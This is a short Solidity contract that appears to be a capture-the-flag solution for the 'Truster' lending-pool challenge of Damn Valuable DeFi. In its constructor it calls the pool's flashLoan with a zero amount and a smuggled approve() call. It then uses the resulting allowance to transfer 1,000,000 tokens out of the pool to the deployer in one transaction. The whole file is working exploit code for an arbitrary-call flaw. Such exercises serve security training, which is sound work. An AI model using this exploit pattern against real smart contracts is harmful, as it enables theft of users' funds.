//SPDX-License-Identifier:MIT

pragma solidity ^0.8.16;
import {TrusterLenderPool} from "./TrusterLenderPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {console} from "forge-std/console.sol";

/**
 * @title AttackerUpgrade all logic move to constructor to makesure within one transaction
 *
 *
 */
contract AttackerUpgrade {
    constructor(TrusterLenderPool _pool, DamnValuableToken _token) {
        console.log("Attacker address: %s", address(this));
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            1000000 ether
        );
        _pool.flashLoan(0, address(this), address(_token), data);
        _token.transferFrom(address(_pool), msg.sender, 1000000 ether);
    }
}
